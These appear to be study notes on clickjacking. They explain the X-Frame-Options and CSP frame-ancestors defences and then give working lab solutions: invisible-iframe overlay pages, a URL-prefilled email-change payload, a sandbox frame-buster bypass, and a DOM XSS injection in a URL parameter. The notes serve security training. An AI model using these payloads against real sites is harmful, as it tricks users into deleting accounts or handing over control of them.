# Clickjacking (UI dressing)
Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website.

## Prevention: X-Frame-Options
The header provides the website owner with control over the use of iframes or objects:
- `X-Frame-Options: deny`: prohibit the inclusion of a web page within a frame.
- `X-Frame-Options: sameorigin`: allow inclusion from same origin pages.
- `X-Frame-Options: allow-from https://normal-website.com`: allow inclusion in specific website

## Prevention: Content Security Policy (CSP)
The CSP provides the client browser with information about permitted sources of web resources that the browser can apply to the detection and interception of malicious behaviors.
- `Content-Security-Policy: frame-ancestors 'none` $\approx$ `X-Frame-Options: deny`
- `Content-Security-Policy: frame-ancestors 'self` $\approx$ `X-Frame-Options: sameorigin`
- `Content-Security-Policy: frame-ancestors normal-website.com;` $\approx$ `X-Frame-Options: allow-from https://normal-website.com`

### LAB: Basic clickjacking with CSRF token protection
Make the `Click me` button appears on top of the `Delete account` button

    <style>
        iframe {
            position:relative;
            width:700px ;
            height: 500px ;
            opacity: 0.0001;
            z-index: 2;
        }
        div {
            position:absolute;
            top:490px;
            left:90px;
            z-index: 1;
        }
    </style>
    <div>Click me</div>
    <iframe src="https://0a7f00fb0434b60680eaadca00cc00c2.web-security-academy.net/my-account"></iframe>

### LAB: Clickjacking with form input data prefilled from a URL parameter
Same as above Lab but add the parameter: `email=hacker@attacker-website.com`

    <style>
        iframe {
            position:relative;
            width:700px;
            height: 500px;
            opacity: 0.1;
            z-index: 2;
        }
        div {
            position:absolute;
            top:450px;
            left:80px;
            z-index: 1;
        }
    </style>
    <div>Click me</div>
    <iframe src="https://0a0a00040456e761804f8a7b00270058.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>

### LAB: Clickjacking with a frame buster script
The sandbox attribute enables an extra set of restrictions for the content in the iframe.
When the sandbox attribute is present, and it will:
- treat the content as being from a unique origin
- block form submission
- block script execution
- disable APIs
- prevent links from targeting other browsing contexts
- prevent content from using plugins (through `<embed>`, `<object>`, `<applet>`, or other)
- prevent the content to navigate its top-level browsing context
- block automatically triggered features (such as automatically playing a video or automatically focusing a form control)

The value of the sandbox attribute can either be empty (then all restrictions are applied), or a space-separated list of pre-defined values that will REMOVE the particular restrictions.

Use `sandbox="allow-forms"` to only allow form submission:

    <style>
        iframe {
            position:relative;
            width:700px;
            height: 500px;
            opacity: 0.0001;
            z-index: 2;
        }
        div {
            position:absolute;
            top:450px;
            left:80px;
            z-index: 1;
        }
    </style>
    <div>Click me</div>
    <iframe src="https://0a66008a03005e8f81c370a5007400a8.web-security-academy.net/my-account?email=hacker@attacker-website.com" sandbox="allow-forms"></iframe>

### LAB: Exploiting clickjacking vulnerability to trigger DOM-based XSS
Take advantage of the XSS at the `Name` input.

    <head>
        <style>
            iframe {
            position: relative;
            width: 700px;
            height: 900px;
            opacity: 0.0001;
            z-index: 2;
            }
            div {
            position: absolute;
            top: 795px;
            left: 80px;
            z-index: 1;
            }
        </style>
    </head>
    <body>
        <iframe
            src="https://0ac70017037061ef80b73f1700e2006f.web-security-academy.net/feedback?name=%3Cimg%20src=1%20onerror=print()%3E&email=abc@a.com&subject=ac&message=a"
        ></iframe>
        <div>Click me</div>
    </body>

### LAB: Multistep clickjacking

    <head>
        <style>
            iframe {
                position: relative;
                width: 700px;
                height: 700px;
                opacity: 0.1;
                z-index: 2;
            }
            #div1 {
                position: absolute;
                top: 500px;
                left: 50px;
                z-index: 1;
            }
            #div2 {
                position: absolute;
                top: 290px;
                left: 200px;
                z-index: 1;
            }
        </style>
    </head>
    <body>
        <iframe
            src="https://0a51002b03ecfd118384ebfc00bf006d.web-security-academy.net/my-account"
        ></iframe>
        <div id="div1">Click me first</div>
        <div id="div2">Click me next</div>
    </body>
